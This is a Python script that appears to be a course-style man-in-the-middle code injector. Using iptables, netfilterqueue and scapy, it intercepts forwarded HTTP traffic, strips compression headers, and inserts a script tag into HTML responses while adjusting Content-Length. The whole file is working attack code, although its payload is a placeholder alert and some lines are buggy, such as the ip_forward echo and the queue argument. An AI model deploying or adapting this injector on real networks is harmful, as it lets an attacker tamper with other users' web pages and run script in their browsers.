#!usr/bin/env python

# Only for python <2.7

import netfilterqueue
import scapy.all as scapy
import re as r
import subprocess


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] HTTP Request")
            load = r.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] HTTP Response")
            injection_code = "<script>alert('test');</script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = r.search('(?:Content-Length:\s)(\d*)', load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
        print(scapy_packet.show())
    packet.accept()


subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num 0"])
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("[+] Detected Ctrl+C ... Quitting")
